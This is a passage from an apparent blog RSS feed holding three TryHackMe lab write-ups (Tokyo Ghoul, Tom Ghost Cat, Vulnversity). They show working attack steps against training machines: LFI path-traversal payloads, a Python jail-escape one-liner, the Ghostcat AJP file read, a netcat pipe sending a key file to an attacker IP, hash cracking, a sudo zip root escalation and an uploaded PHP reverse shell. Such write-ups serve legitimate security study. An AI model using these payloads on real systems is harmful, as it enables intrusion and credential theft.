        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-tokyo-ghoul-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/nqdEYNI.png" alt="Featured image of post TryHackMe: Tokyo Ghoul Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/tokyoghoul666&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1 Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;❯ nmap -sC -sV -A 10.10.202.61
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-17 01:48 EDT
Nmap scan report for 10.10.202.61
Host is up (0.19s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 need_Help?
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.150.214
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fa:9e:38:d3:95:df:55:ea:14:c9:49:d8:0a:61:db:5e (RSA)
|   256 ad:b7:a7:5e:36:cb:32:a0:90:90:8e:0b:98:30:8a:97 (ECDSA)
|_  256 a2:a2:c8:14:96:c5:20:68:85:e5:41:d0:aa:53:8b:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome To Tokyo goul
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.17 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;12-ftp&#34;&gt;1.2 FTP&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 need_Help?
226 Directory send OK.
ftp&amp;gt; cd need_Help?
250 Directory successfully changed.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           480 Jan 23 22:26 Aogiri_tree.txt
drwxr-xr-x    2 ftp      ftp          4096 Jan 23 22:26 Talk_with_me
226 Directory send OK.
ftp&amp;gt; get Aogiri_tree.txt
...
ftp&amp;gt; cd Talk_with_me
250 Directory successfully changed.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 ftp      ftp         17488 Jan 23 22:26 need_to_talk
-rw-r--r--    1 ftp      ftp         46674 Jan 23 22:26 rize_and_kaneki.jpg
226 Directory send OK.
ftp&amp;gt; get need_to_talk
...
ftp&amp;gt; get rize_and_kaneki.jpg
...
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;13-file-exploration&#34;&gt;1.3 File Exploration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;❯ file need_to_talk
need_to_talk: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=adba55165982c79dd348a1b03c32d55e15e95cf6, for GNU/Linux 3.2.0, not stripped
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;❯ ./need_to_talk
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I&#39;m looking for?

&amp;gt; no
Hmm. I don&#39;t think this is what I was looking for.
Take a look inside of me. rabin2 -z
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;❯ strings need_to_talk
...
u/UH
You_founH
d_1t
[]A\A]A^A_
{username}
...
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;❯ ./need_to_talk
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I&#39;m looking for?

&amp;gt; {username}
Good job. I believe this is what you came for:
{stego pass}
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;❯ steghide --extract --stegofile rize_and_kaneki.jpg
Enter passphrase: 
wrote extracted data to &amp;quot;yougotme.txt&amp;quot;.
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;❯ cat yougotme.txt
haha you are so smart kaneki but can you talk my code 

..... .-
....- ....-
....- -....
--... ----.
{truncated}
...

if you can talk it allright you got my secret directory 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using: &lt;a class=&#34;link&#34; href=&#34;http://icyberchef.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CyberChef&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/zVhiiBo.png&#34; alt=&#34;&#34;  /&gt;
We have the secret directory!&lt;/p&gt;
&lt;h3 id=&#34;14-web-exploration&#34;&gt;1.4 Web Exploration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/qPK7Yzn.png&#34; alt=&#34;&#34;  /&gt;
It tells us to scan, so let&amp;rsquo;s do that.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/TOFQmZX.png&#34; alt=&#34;&#34;  /&gt;
We reach at an intersting page, which looks vulnerable to LFI.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;index.php?view=../../../../etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/d5MDFgW.png&#34; alt=&#34;&#34;  /&gt;
Intersting! But what about a specially crafted request? Trying the below: &lt;code&gt;index.php?view=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We get the good stuff!
&lt;code&gt;{username}:{some tasty info mmmmm} &lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;15-hash-cracking&#34;&gt;1.5 Hash Cracking&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;❯ john --wordlist=&amp;quot;/usr/share/wordlists/rockyou.txt&amp;quot; hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
{password mmmmm}      ({username})
1g 0:00:00:01 DONE (2021-03-17 02:43) 0.7812g/s 1200p/s 1200c/s 1200C/s kucing..mexico1
Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;Using this to ssh, we are in!&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s do some exploration.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{username}@vagrant:~$ sudo -l
[sudo] password for {username}: 
Matching Defaults entries for {username} on vagrant.vm:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User {username} may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/{username}/jail.py
{username}@vagrant:~$ ls -la
total 16
drwxr-xr-x 2 root root 4096 Jan 23 22:33 .
drwxr-xr-x 4 root root 4096 Jan 23 22:27 ..
-rw-r--r-- 1 root root  588 Jan 23 22:27 jail.py
-rw-r--r-- 1 root root   33 Jan 23 22:27 user.txt
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{username}@vagrant:~$ cat jail.py 
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print(&amp;quot;Hi! Welcome to my world kaneki&amp;quot;)
    print(&amp;quot;========================================================================&amp;quot;)
    print(&amp;quot;What ? You gonna stand like a chicken ? fight me Kaneki&amp;quot;)
    text = input(&#39;&amp;gt;&amp;gt;&amp;gt; &#39;)
    for keyword in [&#39;eval&#39;, &#39;exec&#39;, &#39;import&#39;, &#39;open&#39;, &#39;os&#39;, &#39;read&#39;, &#39;system&#39;, &#39;write&#39;]:
        if keyword in text:
            print(&amp;quot;Do you think i will let you do this ??????&amp;quot;)
            return;
    else:
        exec(text)
        print(&#39;No Kaneki you are so dead&#39;)
if __name__ == &amp;quot;__main__&amp;quot;:
    main()
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{username}@vagrant:~$ python3 jail.py
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
&amp;gt;&amp;gt;&amp;gt; hi
Traceback (most recent call last):
  File &amp;quot;jail.py&amp;quot;, line 16, in &amp;lt;module&amp;gt;
    main()
  File &amp;quot;jail.py&amp;quot;, line 13, in main
    exec(text)
  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
NameError: name &#39;hi&#39; is not defined
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Uh okay, so cheap trick, let&amp;rsquo;s see if sneaking in works.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; &amp;quot;cat root/root.txt&amp;quot;
No Kaneki you are so dead
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Apparently not. What we need to do is import os and spawn a shell, or, just cat the &lt;code&gt;root/root.txt&lt;/code&gt; file. But, for that, we need to somehow make python execute shell code. How? Python has a built in function &lt;code&gt;exec()&lt;/code&gt; that does just that. So, all we need to do is &lt;strong&gt;python3 jail-break&lt;/strong&gt;. &lt;a class=&#34;link&#34; href=&#34;https://anee.me/escaping-python-jails-849c65cf306e&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Look up here for more information&lt;/a&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;__builtins__.__dict__[&#39;__IMPORT__&#39;.lower()](&#39;OS&#39;.lower()).__dict__[&#39;SYSTEM&#39;.lower()](&#39;cat /root/root.txt&#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we are done!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Tom Ghost Cat Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-tom-ghost-cat-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-tom-ghost-cat-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/8ALIytx.png" alt="Featured image of post TryHackMe: Tom Ghost Cat Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/tomghost&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;recon&#34;&gt;Recon&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;❯ nmap -sC -sV -A -T4 10.10.218.100
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-04 21:58 EST
Nmap scan report for 10.10.218.100
Host is up (0.18s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.05 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This machine shows no port on &lt;code&gt;80&lt;/code&gt;, which explains the reason why Firefox was shouting at me. I looked up for &lt;code&gt;AJP&lt;/code&gt; and &lt;code&gt;Tomcat&lt;/code&gt; and all such combinations. The exploit seems interesting to look a bit deeper into. &lt;a class=&#34;link&#34; href=&#34;https://book.hacktricks.xyz/pentesting/8009-pentesting-apache-jserv-protocol-ajp&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;This&lt;/a&gt; explains the innerworkings of this service and what we could expect going forward. This &lt;a class=&#34;link&#34; href=&#34;https://medium.com/@prem2/ghostcat-vulnerability-cve-2020-1938-ajp-lfi-apache-tomcat-server-vulnerability-9f57330e3eb1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;APJ 13 Vulnerability&lt;/a&gt; explains how &lt;code&gt;WEB-INF/web.xml&lt;/code&gt; is a good starting point.&lt;/p&gt;
&lt;p&gt;Looking up more, we have this tool, called &lt;a class=&#34;link&#34; href=&#34;https://github.com/00theway/Ghostcat-CNVD-2020-10487&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ajshooter&lt;/a&gt;. We see this command plays well with the above explaination. &lt;code&gt;python3 ajpShooter.py http://10.10.218.100:8080 8009 /WEB-INF/web.xml read&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We get:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ python3 ajpshooter.py http://10.10.218.100:8080 8009 /WEB-INF/web.xml read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | &#39;_ \  \ \| &#39;_ \ / _ \ / _ \| __/ _ \ &#39;__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[&amp;lt;] 200 200
[&amp;lt;] Accept-Ranges: bytes
[&amp;lt;] ETag: W/&amp;quot;1261-1583902632000&amp;quot;
[&amp;lt;] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
[&amp;lt;] Content-Type: application/xml
[&amp;lt;] Content-Length: 1261

&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
&amp;lt;!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the &amp;quot;License&amp;quot;); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an &amp;quot;AS IS&amp;quot; BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
--&amp;gt;
&amp;lt;web-app xmlns=&amp;quot;http://xmlns.jcp.org/xml/ns/javaee&amp;quot;
  xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;
  xsi:schemaLocation=&amp;quot;http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&amp;quot;
  version=&amp;quot;4.0&amp;quot;
  metadata-complete=&amp;quot;true&amp;quot;&amp;gt;

  &amp;lt;display-name&amp;gt;Welcome to Tomcat&amp;lt;/display-name&amp;gt;
  &amp;lt;description&amp;gt;
     Welcome to GhostCat
        skyfuck:{haha, password go brr}
  &amp;lt;/description&amp;gt;

&amp;lt;/web-app&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With no other port open, its safe to say that those are ssh credentials :D&lt;/p&gt;
&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;❯ ssh skyfuck@10.10.218.100
The authenticity of host &#39;10.10.218.100 (10.10.218.100)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:hNxvmz+AG4q06z8p74FfXZldHr0HJsaa1FBXSoTlnss.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;10.10.218.100&#39; (ECDSA) to the list of known hosts.
skyfuck@10.10.218.100&#39;s password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;skyfuck@ubuntu:/home/merlin$ cat user.txt 
THM{stonks}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;privesc&#34;&gt;PrivEsc&lt;/h2&gt;
&lt;p&gt;Using the commands on the machine &lt;code&gt;skyfuck@ubuntu:~$ cat tryhackme.asc | netcat 10.8.150.214 6969&lt;/code&gt; and &lt;code&gt;❯ nc -lnvp 6969 &amp;gt; tryhackme.asc&lt;/code&gt; on ours, we transfer the files for further inspection.&lt;/p&gt;
&lt;p&gt;We do the same for &lt;code&gt;credentials.pgp&lt;/code&gt;. It looks like we need some passphrase before doing this, so lets do &lt;code&gt;gpg2john&lt;/code&gt; and then run &lt;code&gt;john&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ gpg2john tryhackme.asc &amp;gt; hash

File tryhackme.asc
❯ cat hash
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme &amp;lt;stuxnet@tryhackme.com&amp;gt;::tryhackme.asc
❯ john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (ciphers algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2021-03-04 23:51) 1.694g/s 1816p/s 1816c/s 1816C/s theresa..alexandru
Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s import, this time giving the passphrase&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ gpg --import tryhackme.asc
gpg: key 8F3DA3DEC6707170: &amp;quot;tryhackme &amp;lt;stuxnet@tryhackme.com&amp;gt;&amp;quot; not changed
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: &amp;quot;tryhackme &amp;lt;stuxnet@tryhackme.com&amp;gt;&amp;quot; not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and now,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ gpg --decrypt cred.pgp
gpg: WARNING: ciphers algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      &amp;quot;tryhackme &amp;lt;stuxnet@tryhackme.com&amp;gt;&amp;quot;
merlin:{haha, password go brr}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are done with the lateral movement!&lt;/p&gt;
&lt;p&gt;Now, onto &lt;code&gt;merlin&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ ssh merlin@10.10.218.100
merlin@10.10.218.100&#39;s password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Tue Mar 10 22:56:49 2020 from 192.168.85.1
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
merlin@ubuntu:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;gtfobins makes it too easy lmao&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT &#39;sh #&#39;
  adding: etc/hosts (deflated 31%)
# ls
user.txt
# whoami
root
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we are done!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# cd /root
# ls
root.txt  ufw
# cat root.txt
THM{pwned!}
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>TryHackMe: Vuln University Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-vuln-university-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-vuln-university-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/5x36aqY.png" alt="Featured image of post TryHackMe: Vuln University Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/vulnversity&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;task-1---deploy-the-machine&#34;&gt;Task 1 - Deploy the machine&lt;/h2&gt;
&lt;p&gt;ezpz&lt;/p&gt;
&lt;h2 id=&#34;task-2---recon&#34;&gt;Task 2 - Recon&lt;/h2&gt;
&lt;p&gt;classic nmap scan&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ nmap -sC -sV -A 10.10.197.89
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-07 21:43 EST
Nmap scan report for 10.10.197.89
Host is up (0.18s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2021-03-07T21:43:45-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-08T02:43:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.10 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;scan-the-box-how-many-ports-are-open&#34;&gt;Scan the box, how many ports are open?&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;6&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;what-version-of-the-squid-proxy-is-running-on-the-machine&#34;&gt;What version of the squid proxy is running on the machine?&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;3.5.12&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;how-many-ports-will-nmap-scan-if-the-flag--p-400-was-used&#34;&gt;How many ports will nmap scan if the flag -p-400 was used?&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;400&lt;/code&gt;
(bruh)&lt;/p&gt;
&lt;h3 id=&#34;using-the-nmap-flag--n-what-will-it-not-resolve&#34;&gt;Using the nmap flag -n what will it not resolve?&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;dns&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;what-is-the-most-likely-operating-system-this-machine-is-running&#34;&gt;What is the most likely operating system this machine is running?&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ubuntu&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;what-port-is-the-web-server-running-on&#34;&gt;What port is the web server running on?&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;3333&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;its-important-to-ensure-you-are-always-doing-your-reconnaissance-thoroughly-before-progressing-knowing-all-open-services-which-can-all-be-points-of-exploitation-is-very-important-dont-forget-that-ports-on-a-higher-range-might-be-open-so-always-scan-ports-after-1000-even-if-you-leave-scanning-in-the-background&#34;&gt;Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don&amp;rsquo;t forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)&lt;/h3&gt;
&lt;p&gt;ok&lt;/p&gt;
&lt;h2 id=&#34;task-3---locating-directories-using-gobuster&#34;&gt;Task 3 - Locating directories using gobuster&lt;/h2&gt;
&lt;p&gt;(have not included the gobuster scan results, since its pretty basic)&lt;/p&gt;
&lt;h3 id=&#34;what-is-the-directory-that-has-an-upload-form-page&#34;&gt;What is the directory that has an upload form page?&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;/internal/&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;task-4---compromise-the-webserver&#34;&gt;Task 4 - Compromise the webserver&lt;/h2&gt;
&lt;p&gt;We see the option to upload the files. The default way to try and upload the &lt;code&gt;phpreverseshell.php&lt;/code&gt; files, but apparently &lt;code&gt;.php&lt;/code&gt; is not allowed.&lt;/p&gt;
&lt;p&gt;At this point, the room suggests using burpsuite to intercept the requests, and try out different php extensions. However, its more simple to just do it by hand :D&lt;/p&gt;
&lt;h3 id=&#34;run-this-attack-what-extension-is-allowed&#34;&gt;Run this attack, what extension is allowed?&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;phtml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Once you have the &lt;code&gt;phprevshell.phtml&lt;/code&gt; uploaded, go to &lt;code&gt;/include/uploads/phprevshell.phtml&lt;/code&gt; and setup netcat in parallel. Once you get in, get a proper shell by doing &lt;code&gt;python3 -c &amp;quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&lt;/code&gt;. For the next question, just do &lt;code&gt;cat /etc/passwd&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;what-is-the-name-of-the-user-who-manages-the-webserver&#34;&gt;What is the name of the user who manages the webserver?&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;bill&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;what-is-the-user-flag&#34;&gt;What is the user flag?&lt;/h3&gt;
&lt;p&gt;{hmmmmmmmmmmmmmmmmmmmmmmmm}&lt;/p&gt;
